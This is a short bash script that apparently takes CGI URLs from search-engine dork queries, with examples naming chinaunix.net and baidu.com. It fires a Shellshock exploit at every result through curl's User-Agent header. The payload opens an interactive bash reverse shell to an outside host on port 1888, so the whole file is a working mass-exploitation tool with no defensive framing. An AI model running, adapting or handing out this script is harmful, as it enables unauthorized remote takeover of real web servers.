#!/bin/bash
#./bashshock.sh -w "ext:cgi site:www.chinaunix.net"
#./bashshock.sh -w "site:baidu.com ext:cgi"
./ghack.py "$@" | awk '{
	if (length($0) > 2 && substr($0, 1, 1) != "*") {
		count += 1;
		sub(/\x0d/, "", $0)
		print $0;
		shock = "\"() { :; }; /bin/bash -i > /dev/tcp/comealong.oicp.net/1888 0<&1 2>&1\" \"" $0 "\" > /dev/null";
		#print "curl -A" shock " -v";
		system("curl -A" shock " -v");
	}
} END {print "count: " count}'
